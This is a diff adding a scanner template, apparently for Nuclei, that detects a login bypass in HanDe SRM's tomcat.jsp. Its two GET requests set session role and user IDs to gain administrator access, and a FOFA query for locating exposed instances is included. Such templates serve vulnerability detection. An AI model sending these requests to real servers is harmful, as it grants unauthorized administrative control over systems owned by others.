@@ -1,0 +1,31 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - Server Info.
+    - "Session \u5217\u8868"
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/tomcat.jsp?dataName=role_id&dataValue=1'
+  - '{{BaseURL}}/tomcat.jsp?dataName=user_id&dataValue=1'
+  stop-at-first-match: true
+id: hand-srm-auth-bypass
+info:
+  author: Co5mos
+  description: There is a login bypass vulnerability in the HanDe SRM tomcat.jsp file,
+    where attackers can gain backend administrator privileges by sending request packets.
+  metadata:
+    fofa-query: "app=\"\u6C49\u5F97SRM\u4E91\u5E73\u53F0\""
+    max-request: 2
+    verified: true
+  name: Hand SRM - Path Bypass
+  reference:
+  - https://peiqi.wgpsec.org/wiki/webapp/%E6%B1%89%E5%BE%97/%E6%B1%89%E5%BE%97SRM%20tomcat.jsp%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html
+  severity: high
+  tags: hand,lfi
